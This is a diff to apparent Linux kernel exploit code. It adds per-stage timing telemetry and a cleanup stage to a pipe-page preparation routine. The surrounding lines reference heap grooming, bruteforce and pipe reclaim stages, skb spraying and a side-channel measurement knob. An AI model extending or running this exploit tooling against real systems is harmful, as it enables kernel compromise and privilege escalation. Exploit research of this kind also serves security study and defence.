@@ -138,8 +138,11 @@ enum pipe_prepare_stage {
   PIPE_STAGE_BRUTEFORCE,
   PIPE_STAGE_RESIZE_DRAIN,
   PIPE_STAGE_RESIZE_RECLAIM,
+  PIPE_STAGE_CLEANUP,
   PIPE_STAGE_DONE,
 };
+
+#define PIPE_STAGE_COUNT (PIPE_STAGE_DONE + 1)
 
 enum pipe_error {
   PIPE_E_NONE = 0,
@@ -158,6 +161,7 @@ enum pipe_error {
 struct pipe_prepare_progress {
   atomic_int stage;
   atomic_int error_no;
+  atomic_uint_fast64_t entered_ms[PIPE_STAGE_COUNT];
 };
 
 struct pipe_attempt_diag {
@@ -217,6 +221,7 @@ static const char *pipe_stage_name(enum pipe_prepare_stage stage) {
   case PIPE_STAGE_BRUTEFORCE: return "bruteforce";
   case PIPE_STAGE_RESIZE_DRAIN: return "resize-drain";
   case PIPE_STAGE_RESIZE_RECLAIM: return "resize-reclaim";
+  case PIPE_STAGE_CLEANUP: return "cleanup";
   case PIPE_STAGE_DONE: return "done";
   }
   return "unknown";
@@ -437,8 +442,37 @@ static int send_skb(int sock, void *buffer) {
  * 240 reclaim pipes. Runs inside the long-lived holder child. */
 static void set_prepare_progress(struct pipe_prepare_progress *progress,
                                  enum pipe_prepare_stage stage) {
+  uint64_t now_ms = monotonic_ms();
+  if (stage >= PIPE_STAGE_IDLE && stage <= PIPE_STAGE_DONE) {
+    atomic_store_explicit(&progress->entered_ms[stage], now_ms,
+                          memory_order_release);
+  }
   atomic_store_explicit(&progress->stage, stage, memory_order_release);
-  atomic_store_explicit(&progress->error_no, errno, memory_order_release);
+}
+
+static void log_prepare_telemetry(struct pipe_prepare_progress *progress,
+                                  uint64_t finished_ms) {
+  uint64_t first_ms = atomic_load_explicit(
+      &progress->entered_ms[PIPE_STAGE_BANKS], memory_order_acquire);
+  fprintf(stderr, "[pipe_rw] telemetry stage_ms");
+  for (int stage = PIPE_STAGE_BANKS; stage < PIPE_STAGE_DONE; stage++) {
+    uint64_t entered = atomic_load_explicit(
+        &progress->entered_ms[stage], memory_order_acquire);
+    if (!entered) continue;
+    uint64_t next = 0;
+    for (int later = stage + 1; later <= PIPE_STAGE_DONE; later++) {
+      next = atomic_load_explicit(&progress->entered_ms[later],
+                                  memory_order_acquire);
+      if (next) break;
+    }
+    uint64_t ended = next ? next : finished_ms;
+    fprintf(stderr, " %s=%llums", pipe_stage_name(stage),
+            (unsigned long long)(ended >= entered ? ended - entered : 0));
+  }
+  fprintf(stderr, " total=%llums\n",
+          (unsigned long long)(first_ms && finished_ms >= first_ms
+                                   ? finished_ms - first_ms
+                                   : 0));
 }
 
 /* Experiment knob shared with groom.c: KernelSnitch measurement repeat and
@@ -465,6 +499,7 @@ static uint64_t prepare_pipe_page_child(
   int reclaim[2] = {-1, -1};
   unsigned char *skb = NULL;
   uint64_t base = 0;
+  int succeeded = 0;
 
   raise_rlimit_best_effort(RLIMIT_NOFILE);
   raise_rlimit_best_effort(RLIMIT_NPROC);
@@ -588,8 +623,9 @@ static uint64_t prepare_pipe_page_child(
   }
 
 out:
-  if (base) {
-    set_prepare_progress(progress, PIPE_STAGE_DONE);
+  succeeded = base != 0;
+  if (succeeded) {
+    set_prepare_progress(progress, PIPE_STAGE_CLEANUP);
   } else {
     atomic_store_explicit(&progress->error_no, errno, memory_order_release);
   }
@@ -616,6 +652,9 @@ out:
   cleanup_mm_ctx(&pre);
   cleanup_mm_ctx(&post);
   free(skb);
+  if (succeeded) {
+    set_prepare_progress(progress, PIPE_STAGE_DONE);
+  }
   return base;
 }
 
@@ -662,6 +701,11 @@ static uint64_t prepare_pipe_page(int timeout_ms, struct pipe_attempt_diag *diag
   }
   atomic_init(&progress->stage, PIPE_STAGE_BANKS);
   atomic_init(&progress->error_no, 0);
+  for (int stage = PIPE_STAGE_IDLE; stage <= PIPE_STAGE_DONE; stage++) {
+    atomic_init(&progress->entered_ms[stage], 0);
+  }
+  atomic_store_explicit(&progress->entered_ms[PIPE_STAGE_BANKS], started_ms,
+                        memory_order_release);
 
   int result_pipe[2] = {-1, -1};
   if (pipe(result_pipe) != 0) {
@@ -754,6 +798,8 @@ static uint64_t prepare_pipe_page(int timeout_ms, struct pipe_attempt_diag *diag
     diag->error_no = atomic_load_explicit(&progress->error_no,
                                           memory_order_acquire);
   }
+  uint64_t finished_ms = monotonic_ms();
+  log_prepare_telemetry(progress, finished_ms);
   close(result_pipe[0]);
   close_pipe_bank(g_drain_pipes);
   if (!got || !base) {
@@ -761,13 +807,13 @@ static uint64_t prepare_pipe_page(int timeout_ms, struct pipe_attempt_diag *diag
     close_pipe_bank(g_reclaim_pipes);
     diag->error = PIPE_E_PREPARE;
     munmap(progress, sizeof(*progress));
-    diag->elapsed_ms = monotonic_ms() - started_ms;
+    diag->elapsed_ms = finished_ms - started_ms;
     return 0;
   }
   diag->error = PIPE_E_NONE;
   diag->stage = PIPE_STAGE_DONE;
   munmap(progress, sizeof(*progress));
-  diag->elapsed_ms = monotonic_ms() - started_ms;
+  diag->elapsed_ms = finished_ms - started_ms;
   return base;
 }
 
